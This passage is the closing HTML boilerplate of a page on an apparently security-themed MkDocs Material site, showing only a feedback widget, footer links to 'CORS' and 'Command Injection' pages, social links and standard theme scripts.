+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+  
+  <!-- Tags -->
+  
+  
+  <!-- Actions -->
+  
+  
+  
+
+  
+  <!--
+    Hack: check whether the content contains a h1 headline. If it doesn't, the
+    page title (or respectively site name) is used as the main headline.
+    Checking for the needle `<h1` is not perfect, but it should be good enough
+    for now. Also note that we can't use `toc_tokens` as an indicator, since
+    the `toc` extension might be absent.
+  -->
+  
+  
+  
+  <!-- Navigation -->
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+
+      <!-- Link to previous page -->
+      
+        <a
+          href="../../CORS/index.html"
+          class="md-footer__link md-footer__link--prev"
+          aria-label="Previous: Cross-Origin Resource Sharing (CORS)"
+        >
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <span class="md-footer__direction">
+              Previous
+            </span>
+            <div class="md-ellipsis">
+              Cross-Origin Resource Sharing (CORS)
+            </div>
+          </div>
+        </a>
+      
+
+      <!-- Link to next page -->
+      
+        <a
+          href="../OS-command-injection/index.html"
+          class="md-footer__link md-footer__link--next"
+          aria-label="Next: Command Injection"
+        >
+          <div class="md-footer__title">
+            <span class="md-footer__direction">
+              Next
+            </span>
+            <div class="md-ellipsis">
+              Command Injection
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  
+  <!-- Comments -->
+  
+</article>
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../CORS/index.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: Cross-Origin Resource Sharing (CORS)">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Cross-Origin Resource Sharing (CORS)
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../OS-command-injection/index.html" class="md-footer__link md-footer__link--next" aria-label="Next: Command Injection">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Command Injection
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright © 2025 Tom Fieber
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.50899def.min.js"></script>
+      
+        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
+      
+        <script src="../../../../javascripts/tablesort.js"></script>
+      
+        <script src="../../../../javascripts/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
